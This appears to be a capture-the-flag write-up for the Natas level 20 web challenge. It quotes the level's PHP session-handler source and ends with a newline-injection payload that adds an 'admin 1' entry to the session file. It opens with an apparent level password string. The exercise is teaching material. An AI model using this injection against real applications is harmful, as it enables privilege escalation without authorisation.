```
BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
```

# Solution
To get the password, the function first check if the array `$_Session` contains the key `admin` and its value must be 1
```php
function print_credentials() { /* {{{ */    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {  
    print "You are an admin. The credentials for the next level are:<br>";  
    print "<pre>Username: natas21\n";  
    print "Password: <censored></pre>";  
    } else {  
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";  
    }  
}
```

Whenever we POST with the `change name` button, it generates a new sid and a session file called `mysess` concatenated with the generated sid. The sid is also the cookie.

```php
function mywrite($sid, $data) {    // $data contains the serialized version of $_SESSION  
    // but our encoding is better    debug("MYWRITE $sid $data");    // make sure the sid is alnum only!!    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {    debug("Invalid SID");  
        return;  
    }    $filename = session_save_path() . "/" . "mysess_" . $sid;    $data = "";    debug("Saving in ". $filename);    ksort($_SESSION);  
    foreach($_SESSION as $key => $value) {        debug("$key => $value");        $data .= "$key $value\n";  
    }    file_put_contents($filename, $data);    chmod($filename, 0600);  
    return true;  
}
```

When we load our session, it reads the session file respective to our cookie value. It will read the content LINE BY LINE and injects into the array.
```php
function myread($sid) {    debug("MYREAD $sid");  
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {    debug("Invalid SID");  
        return "";  
    }    $filename = session_save_path() . "/" . "mysess_" . $sid;  
    if(!file_exists($filename)) {        debug("Session file doesn't exist");  
        return "";  
    }    debug("Reading from ". $filename);    $data = file_get_contents($filename);    $_SESSION = array();  
    foreach(explode("\n", $data) as $line) {        debug("Read [$line]");    $parts = explode(" ", $line, 2);  
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];  
    }  
    return session_encode() ?: "";  
}
```

Here, since `myread` is called first, we can utilize the call order to exploit:
```php
session_set_save_handler(    "myopen",    "myclose",    "myread",    "mywrite",    "mydestroy",    "mygarbage");  
session_start();  
  
if(array_key_exists("name", $_REQUEST)) {    $_SESSION["name"] = $_REQUEST["name"];    debug("Name set to " . $_REQUEST["name"]);  
}  
  
print_credentials();
```

Our payload would be:
```
name=whatever%0Aadmin%201
```
